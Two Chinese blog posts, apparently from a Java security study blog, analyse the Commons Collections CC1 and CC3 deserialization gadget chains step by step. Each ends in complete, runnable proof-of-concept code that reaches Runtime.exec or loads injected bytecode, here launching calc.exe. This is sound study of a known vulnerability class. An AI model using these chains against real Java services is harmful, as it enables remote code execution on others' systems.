[{"title":"commons-collection3","url":"/2023/03/30/commons-collection3/","content":"\n\n## CC3\n\n沿用CC1的环境即可\n\n只是最终命令执行的方法换了，后面链子没啥区别\n\n## POP\n\n### newTransformer\n\n在讲 **ClassLoader** 的 **TemplatesImpl** 时说到\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx43ec5db404139d987de5674f25db9f15chenghaiwen20230330234720-image-20230328233558056.png\n)\n\n最后有两个**public**，其中一个是`newTransformer`，这是最终命令执行的入口\n\n### InstantiateTransformer\n\n另一个最大的区别就是没有使用 **InvokerTransformer** ，而是 **InstantiateTransformer** \n\n这个类的`transform`的特点就是，通过反射获取构造方法并实例化某个类\n\n```java\npublic Object transform(Object input) {\n    try {\n        if (input instanceof Class == false) {\n            throw new FunctorException(\n                \"InstantiateTransformer: Input object was not an instanceof Class, it was a \"\n                    + (input == null ? \"null object\" : input.getClass().getName()));\n        }\n        Constructor con = ((Class) input).getConstructor(iParamTypes);\n        return con.newInstance(iArgs);\n\n    } catch (NoSuchMethodException ex) {\n        throw new FunctorException(\"InstantiateTransformer: The constructor must exist and be public \");\n    } catch (InstantiationException ex) {\n        throw new FunctorException(\"InstantiateTransformer: InstantiationException\", ex);\n    } catch (IllegalAccessException ex) {\n        throw new FunctorException(\"InstantiateTransformer: Constructor must be public\", ex);\n    } catch (InvocationTargetException ex) {\n        throw new FunctorException(\"InstantiateTransformer: Constructor threw an exception\", ex);\n    }\n}\n```\n\n我们可以通过这个类实例化 **TrAXFilter** ，因为它在构造函数里面就会调用`newTransformer`，正好串上了 **TemplatesImpl** 的链子\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx3e61fd884361cbee32e0bbe50ae3ae33chenghaiwen20230330234723-image-20230328234426075.png\n)\n\n### 完整链\n\n最终的链子（就不细讲，大体思想一样，区别就上面介绍的\n\n```java\npackage org.example;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class CC3Test {\n public static void main(String[] args) throws Exception {\n     byte[] code = Files.readAllBytes(Paths.get(\"D:\\\\tmp\\\\java\\\\classes\\\\TemplateslmplTest.class\"));\n     TemplatesImpl templatesImpl = new TemplatesImpl();\n     setFieldValue(\"_name\", \"Hello\", templatesImpl);\n     setFieldValue(\"_bytecodes\", new byte[][]{code}, templatesImpl);\n     setFieldValue(\"_outputProperties\", new Properties(), templatesImpl);\n     setFieldValue(\"_indentNumber\", 0, templatesImpl);\n     setFieldValue(\"_tfactory\", new TransformerFactoryImpl(), templatesImpl);\n\n     Transformer[] transformers = new Transformer[]{\n             new ConstantTransformer(TrAXFilter.class),\n             new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})\n     };\n     ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n     Map<Object, Object> map = new HashMap<>();\n     Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);\n\n     Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n     Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\n     annotationInvocationHandlerConstructor.setAccessible(true);\n     InvocationHandler i = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, lazyMap);\n\n     Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, i);\n\n     Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, mapProxy);\n     serialize(o);\n     unserialize(\"ser.bin\");\n }\n\n    public static void setFieldValue(String name, Object value, Object obj) throws Exception{\n        Field f = obj.getClass().getDeclaredField(name);\n        f.setAccessible(true);\n        f.set(obj, value);\n    }\n\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    }\n\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx79cae0ebdaaa34ae79341d2d7abb5300chenghaiwen20230330234726-image-20230328235841676.png)\n","tags":["java安全"]},{"title":"commons-collection1","url":"/2023/03/30/commons-collection1/","content":"\n\n# 环境搭建\n\n\n**jdk_8u65** 网上随便找的一个\n\n[sun源码包](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4) 下载后解压，把 `jdk-af660750b2f4/src/share/classes/sun` 放到jdk中src⽂件夹中，默认有个src.zip 需要先解压\n\n**还要导入src**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxb4b959368a97541ee99cb9ce55f94e74chenghaiwen20230330231230-image-20230327163612053.png\n)\n\n新建**maven**项目\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa695cf55618458b21f863dfe8adcfaa9chenghaiwen20230330231233-image-20230322171917611.png\n)\n\n找到cc1链，存在漏洞的版本\n\nhttps://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd4e8406dd0eaa317d3a413182c18044fchenghaiwen20230330231236-image-20230322172032540.png\n)\n\n套上`<dependencies>`\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx584e7aec0dac759ce9ee3d7daa45b930chenghaiwen20230330231238-image-20230322172055370.png\n)\n\n**xml**重载一下，然后下载**commons-collections**源码\n\n# 漏洞分析\n\n那么就开始分析了\n\n## 漏洞处\n\n### Transformer接口\n\n在**Transformer.java**中实现了这个接口\n\n```java\npublic interface Transformer {\n\n    /**\n     * Transforms the input object (leaving it unchanged) into some output object.\n     *\n     * @param input  the object to be transformed, should be left unchanged\n     * @return a transformed object\n     * @throws ClassCastException (runtime) if the input is the wrong class\n     * @throws IllegalArgumentException (runtime) if the input is invalid\n     * @throws FunctorException (runtime) if the transform cannot be completed\n     */\n    public Object transform(Object input);\n\n}\n```\n\n注意这个**transform**方法，接受的是一个`Object`\n\nidea按 `ctrl+alt+b`查看实现该接口的类![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx854c7871de6034b45c10dbd18a808053chenghaiwen20230330231241-image-20230322204202014.png\n)\n\n具体就不一个个看了，漏洞点就在`InvokerTransformer`\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable\n```\n\n它对于**transform**的实现是这样写的\n\n```java\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        }\n        try {\n            Class cls = input.getClass();\n            Method method = cls.getMethod(iMethodName, iParamTypes);\n            return method.invoke(input, iArgs);\n                \n        } catch (NoSuchMethodException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");\n        } catch (IllegalAccessException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");\n        } catch (InvocationTargetException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex);\n        }\n    }\n```\n\n可以看到，**try**这里基本上就是反射常用的几个点，而**iMethodName**和**iArgs**在构造函数里是可以控制的\n\n它又正好继承了**Serializable**，是可以反序列化的\n\n普通java反射命令执行\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    Class c = Runtime.class;\n    Method execMethod = c.getMethod(\"exec\", String.class);\n    execMethod.invoke(r, \"calc.exe\");\n}\n```\n\n先正向实现一下\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    invokerTransformer.transform(r);\n    }\n```\n\n按照它的构造函数传，第二个是**Class数组**，第三个是**Object数组**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx8757558594dc31b83a7e298b3a9c4e54chenghaiwen20230330231244-image-20230322210123115.png\n)\n\n漏洞点证明存在，接下来就是找该`transform`的调用链，怎么用才能调用到这个`transform`，或者是同名`transform`函数\n\n## 寻找漏洞链\n\n右键**Find usages**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxad0ec958e1942836c88605339c126eb9chenghaiwen20230330231246-image-20230322210424098.png\n)\n\n接下来就是慢慢找\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxe298f89cf2973071acab99534867f5c6chenghaiwen20230330231249-image-20230322210636121.png\n)\n\n像这种`transform`里调用`transform`就不用看了\n\n可利用的大概是这么些方法\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx184308c6b4803d7616406862c8d86306chenghaiwen20230330231251-image-20230322211046509.png\n)\n\n**秉持着一般找Map衍生类的做法**，就先看Map里面的\n\n### TransformedMap\n\n此时进入到**TransformedMap**\n\n构造方法是**protected**的，看静态方法\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx978af6aef3631b2bf7f0957c85e1af41chenghaiwen20230330231254-image-20230322212724105.png\n)\n\n然后就看这三个具体方法\n\n#### transformKey\n\n它只有这两处可以调用，put一看就知道，填充Map\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx25043bdbbe7513b8667fde877d84518echenghaiwen20230330231256-image-20230322213248739.png\n)\n\n于是可以写出这种半成链\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    Map map = new HashedMap();\n    Map transformedMap = TransformedMap.decorate(map, invokerTransformer, null);\n    transformedMap.put(r, \"value\");\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx3f952320fe63e91867fe61b1cc1c92b5chenghaiwen20230330231258-image-20230322213810651.png\n)\n\n#### transformValue\n\n接下来看第二个\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx334dfcab3981410f2de3f6399c55f114chenghaiwen20230330231302-image-20230322213918135.png\n)\n\n同样也是put，只不过一个是key，一个是value，换换位置就行\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    Map map = new HashedMap();\n    Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer);\n    transformedMap.put(\"key\", r);\n}\n```\n\n#### checkSetValue\n\n但是前面两个都只能在本类中进行调用，可利用性不大\n\n最后是这个\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd9f309ba40fa0b3b2040bbcd9b1363e9chenghaiwen20230330231304-image-20230322214130763.png\n)\n\n这个**AbstractInputCheckedMapDecorator**是**TransformedMap**的父类\n\n而它的名字叫`setValue()`，根据名字来理解，这就是对map遍历的赋值的时候调用的函数\n\n> AbstractInputCheckedMapDecorator 是 TransformedMap 的父类。对 HashMap 比较熟悉的 话对 Map.Entry 一定也不会陌生。 这里简单说一下，我们知道 Map 是用来存放键值对的，HashMap 中一对 k-v 是存放在 HashMap$Node 中的，而 Node 又实现了 Entry 接口，所以可以粗略地认为 k-v 是存放在 Entry 中的，遍历 Map 时,可以通过 entrySet()方法获取到一对对的 k-v（Map.Entry 类 型）。如下代码，通过遍历 TransformedMap，再使用 setValue()传入\n\n引用一个师傅的，此时就相当于是，**entry**储存了key和value，然后对**entry**指向`setValue`，就是更改此时value的值\n\n调试到这里的时候也能很明显的看到\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd25945fd6e165e7768f8f8e098a88d94chenghaiwen20230330231307-image-20230322215339299.png\n)\n\n而这里为什么会执行**AbstractInputCheckedMapDecorator**的该方法呢\n\n因为**AbstractInputCheckedMapDecorator**是它的父类，内置了该`setValue`方法，在**TransformedMap**类中并未对该方法进行重写，所以执行`setValue`时是走到这里\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    Map map = new HashedMap();\n    map.put(\"key\", \"value\");\n    Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);\n    for (Map.Entry entry : transformedMap.entrySet()) {\n        entry.setValue(r);\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx5dda03c7628ca90286b9496023d2ce75chenghaiwen20230330231309-image-20230322215554555.png\n)\n\n### AnnotationInvocationHandler\n\n前面两个都是该类的方法，链子不能进行到`readObject`，所以接下来就看**AbstractInputCheckedMapDecorator**的`setValue`了\n\n虽然38处有点多，但是有一处的`readObject`直接调用了该方法\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxff88125617492a10b033746ae1bb4a4echenghaiwen20230330231312-image-20230322220207340.png\n)\n\n正是遍历的时候调用的\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx4d487334993a16d3e1d62880827bfa9fchenghaiwen20230330231314-image-20230322220312016.png\n)\n\n但是它的构造函数和构造器都不是**public**的（没写public等，就是**default**类型\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxe7fe43e8b9e00db7e6d33b5788c5fe7echenghaiwen20230330231317-image-20230322220646611.png\n)\n\n**default**只能在该**package**下才能得到，所以只能用反射，构造也只能反射构造\n\n#### 反射\n\n先不管其它的，把该类反射出来\n\n构造函数\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxf0c7e9bfe8d162e78cc0c5018fe37a25chenghaiwen20230330231320-image-20230322221418188.png\n)\n\n第一个类型是继承了注解的Class，第二个就是Map\n\n呃呃\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx51dbf16f22cfbc0afe31f2bfcb7e5686chenghaiwen20230330231322-image-20230322221759522.png\n)\n\n而**Override**就是一个注解，所以实例化的时候直接**Override.class**就可以了\n\n实例化代码\n\n```java\nClass c = Class.forName(\"sun,reflect.annotation.AnnotationInvocationHandler\");\nConstructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\nannotationInvocationHandlerConstructor.setAccessible(true);\nObject o = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);\n```\n\n此时如果正常序列化最终得到的o，然后反序列化按理想状况就可以rce了\n\n但是还有几个问题\n\n### Runtime不可序列化\n\nRuntime不可序列化，但是它的**Class**是可以序列化的，即`Runtime.Class`\n\n```java\nClass r = Runtime.class;\nMethod getRuntimeMethod = r.getMethod(\"getRuntime\", null);\nRuntime runtime = (Runtime) getRuntimeMethod.invoke(null, null);\nMethod execMethod = r.getMethod(\"exec\", String.class);\nexecMethod.invoke(runtime, \"calc.exe\");\n```\n\n反射命令执行是这样的，而这每一步都要利用**InvokerTransformer**来执行\n\n我们再来看一下**InvokerTransformer**的相关参数\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa6249ce1dc4e4e4ba4e0b03b4094211dchenghaiwen20230330231324-image-20230322234354747.png\n)\n\n**iMethodName**很明显就是函数名，而**iParamTypes**是**paramTypes**的元素在这里就是**iMethodName**该函数的参数类型，例如我们想执行`getMethod()`，在这里就得传入`getMethod()`的参数类型\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx096e530027c6d97b71c530b825f6dbe9chenghaiwen20230330231327-image-20230322234634993.png\n)\n\n那么第一步，得到**getRuntimeMethod**，即对`Runtime.class`执行`getMethod()`，参数类型为String和Class，但接受的**paramTypes**为Class数组，所以得传`new Class[]{String.class, Class[].class}`，第一个参数String为**getRuntime**，第二个为null\n\n最终编写如下\n\n```java\nMethod getRuntimeMethod = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);\n```\n\n接下来`Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);`，将得到的静态构造函数执行，实例出一个**Runtime**\n\n就是对**getRuntimeMethod**执行`invoke`，两个参数分别如下\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxc1a9e627e92e98a29adcfff1307bf8c2chenghaiwen20230330231329-image-20230322234913153.png\n)\n\n最终编写\n\n```java\nRuntime r = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);\n```\n\n最后就是直接对实例化出来的**Runtime**执行`exec`，参数如下\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx185906c627eb919b11cc70b773344dd6chenghaiwen20230330231331-image-20230322235200680.png\n)\n\n参数值为**calc.exe**，最终编写\n\n```java\nnew InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}).transform(r);\n```\n\n成功执行![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx2d62c685bcc08f53d565fcf3c39b1fcechenghaiwen20230330231334-image-20230322235251633.png\n)\n\n这里有一个小优化，就是类**ChainedTransformer**\n\n该类构造是接受一个**Transformer**数组\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxcfb286b374d34b639db906aa23077f5bchenghaiwen20230330231337-image-20230323000015796.png\n)\n\n然后它的**transform**是对**Transformer**数组元素循环执行`transform`\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx229b7c70a8cc927d86d0ccac285cd150chenghaiwen20230330231340-image-20230323000044060.png\n)\n\n然后上一个执行完得到的**object**充当下一轮的`transform`对象，本来我们需要传入的也只有**Runtime.class**\n\n最后得到\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n};\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nchainedTransformer.transform(Runtime.class);\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx0e74a97b1e43cffc7e9594ae7570df50chenghaiwen20230330231342-image-20230323000723214.png\n)\n\n所以目前，理想上来是编写出这样的链子就好了\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\nMap map = new HashedMap();\nmap.put(\"key\", \"value\");\nMap<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);\n\nClass c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\nannotationInvocationHandlerConstructor.setAccessible(true);\nObject o = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);\n```\n\n\n### 两个if\n\n```java\nprivate void readObject(java.io.ObjectInputStream s)\n    throws java.io.IOException, ClassNotFoundException {\n    s.defaultReadObject();\n\n    // Check to make sure that types have not evolved incompatibly\n\n    AnnotationType annotationType = null;\n    try {\n        annotationType = AnnotationType.getInstance(type);\n    } catch(IllegalArgumentException e) {\n        // Class is no longer an annotation type; time to punch out\n        throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n    }\n\n    Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n    // If there are annotation members without values, that\n    // situation is handled by the invoke method.\n    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n        String name = memberValue.getKey();\n        Class<?> memberType = memberTypes.get(name);\n        if (memberType != null) {  // i.e. member still exists\n            Object value = memberValue.getValue();\n            if (!(memberType.isInstance(value) ||\n                  value instanceof ExceptionProxy)) {\n                memberValue.setValue(\n                    new AnnotationTypeMismatchExceptionProxy(\n                        value.getClass() + \"[\" + value + \"]\").setMember(\n                            annotationType.members().get(name)));\n            }\n        }\n    }\n}\n```\n\n这里可以看到，**AnnotationInvocationHandler**执行`readObject`的时候还有两个if，保证两个if都为true就行\n\n打个断点调试一下\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx11d4a1facdf9c38ff96d464268783869chenghaiwen20230330231345-image-20230323163930553.png\n)\n\n这里获取了注解(也就是**Override**)的实例\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxf0a39fca166bd53965b7710dced99a08chenghaiwen20230330231347-image-20230323164149685.png\n)\n\n然后在这里获取其成员方法（也就是key为方法名，value为返回类型）\n\n**举个例子**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx955818dc1ca1cc5ac1618f611de439a6chenghaiwen20230330231349-image-20230323164521508.png\n)\n\n该注释类，最终得到的**key**和**value**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxb8a330fc5f21aaac909dfef2ec3dce3echenghaiwen20230330231351-image-20230323164547504.png\n)\n\n然后是这里\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx17a2df5c17d7855ae11c50f0eacb1280chenghaiwen20230330231354-image-20230323164921088.png\n)\n\n对**memberValues**执行**getKey**方法，也就是得到此时**key**名，而这个map就是我们前面定义的**HashMap**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx9d85874c2625b0cc85de000c94c0cdcachenghaiwen20230330231356-image-20230323165049162.png\n)\n\n然后得到该**key**名之后，在前面注释类得到的**key**和**value**执行`get`方法,`get(name)`方法就是寻找**key=name**的**value**值\n\n，也就是如果此时我们这个**HashMap**的**key**值等于注释类的**key**值，就能成功返回一个**memberType**\n\n将这里改为\"value\"\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxdfa1c18c7e1b9157ff9df8f530eb01e1chenghaiwen20230330231359-image-20230323165253923.png\n)\n\n再次执行，**memberTypes**就与我们所想的一样，是**Target**方法的返回类型\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxcd6eb9d17ef84b8e1c7acfcc0c0928a6chenghaiwen20230330231401-image-20230323165407550.png\n)\n\n此时第二个if也是可以直接通过的\n\n### 补充\n\n前面编写**chainedTransformer**的时候说过，我们只需要第一个传入的值是**Runtime.class**，后面的就可以正常执行，所以我们还需要构造出一个执行完`transform`后，返回的是**Runtime.class**的类\n\n这里又要说到一个类**ConstantTransformer**\n\n它构造时给**constantToReturn**一个**Runtime.class**，然后它接受一个Object，都是返回该**Runtime.class**，很符合我们的要求\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa6c1bebb76d1c8db0ec4d5508c553937chenghaiwen20230330231403-image-20230323170838131.png\n)\n\nPS：因为第一个**input**的**Object**是这个类，不用管是怎么传进去的...\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx59e7d20ecd8a01658e81f5963b5bdd60chenghaiwen20230330231405-image-20230323171033326.png\n)\n\n### Gadget Chain\n\n至此，整个链子就编写完成了\n\n```java\npackage org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.HashedMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.util.Map;\n\npublic class CC1Test {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        Map map = new HashedMap();\n        map.put(\"value\", \"value\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);\n\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\n        annotationInvocationHandlerConstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);\n\n        serialize(o);\n        unserialize(\"ser.bin\");\n    }\n\n\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx15148c0880f6a46f73624f0e86f2a8dachenghaiwen20230330231408-image-20230323171401461.png\n)\n\n理一理**Gadget Chain**\n\n```java\n/*    \n\tGadget chain:\n        AnnotationInvocationHandler.readObject();\n                transformedMap.entrySet();\n                    Entry.setValue();\n                        transformedMap.checkSetValue();\n                            chainedTransformer.transform();\n                                ConstantTransformer.transform();\n                                      Runtime.class;\n                                InvokerTransformer.transform();\n                                      Runtime.getMethod(\"getRuntime\", null);\n                                InvokerTransformer.transform();\n                                      Runtime.invoke(null, null);\n                                InvokerTransformer.transform();\n                                      Runtime.exec(\"calc.exe\");\n*/\n```\n\n<font color='pink'>**❀完结撒花❀**</font>\n\n# ysoserial\n\n## 分析\n\n**ysoserial**的**CommonsCollections1**链和白日梦师傅不太一样，前者是国外发现cc1链时的链子，后者时国内师傅复现时挖出来的另外一条链\n\n```java\n/*\n\tGadget chain:\n\t\tObjectInputStream.readObject()\n\t\t\tAnnotationInvocationHandler.readObject()\n\t\t\t\tMap(Proxy).entrySet()\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\n\t\t\t\t\t\tLazyMap.get()\n\t\t\t\t\t\t\tChainedTransformer.transform()\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\n\t\t\t\t\t\t\t\t\tMethod.invoke()\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\n\tRequires:\n\t\tcommons-collections\n */\n```\n\n大致都是一样的，只不过map一个用的是**LazyMap**一个是**transformedMap**，\n\n但是**LazyMap**这里是在`get`方法里面调用的`transform`，看链子显示的是在`AnnotationInvocationHandler.invoke()`方法中调用的`LazyMap.get()`，正好是我们输入的**map**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx0a15d99c1a690fce2b60da162be7cc78chenghaiwen20230330231411-image-20230327113723451.png\n)\n\n然后**AnnotationInvocationHandler**实际上是一个动态代理类，所以只要执行该类的方法时就一定会进入到`invoke`，但是要写一个动态代理...但是动态代理有点抽象，还不太懂，然后把那两个if绕过就完事\n\n不过反过来想想，动态代理在java反序列化安全中的作用就是进入特定的`invoke`方法？\n\n然后动态代理的写法其实都是固定的，会写就行了，也不一定非要理解\n\n## 